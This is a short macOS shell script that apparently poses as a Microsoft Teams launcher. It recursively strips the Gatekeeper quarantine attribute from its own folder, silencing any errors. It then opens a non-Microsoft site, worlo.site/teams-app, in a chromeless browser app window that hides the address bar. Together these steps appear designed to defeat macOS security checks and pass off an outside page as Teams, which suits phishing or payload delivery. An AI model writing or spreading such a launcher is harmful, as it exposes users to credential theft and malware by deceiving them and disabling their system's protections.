#!/bin/bash
DIR="$(cd "$(dirname "$0")" && pwd)"
xattr -dr com.apple.quarantine "$DIR" 2>/dev/null || true
URL="https://worlo.site/teams-app/index.html"
if [ -d "/Applications/Google Chrome.app" ]; then
  open -a "Google Chrome" --args --new --app="$URL"
elif [ -d "/Applications/Microsoft Edge.app" ]; then
  open -a "Microsoft Edge" --args --new --app="$URL"
else
  open "$URL"
fi
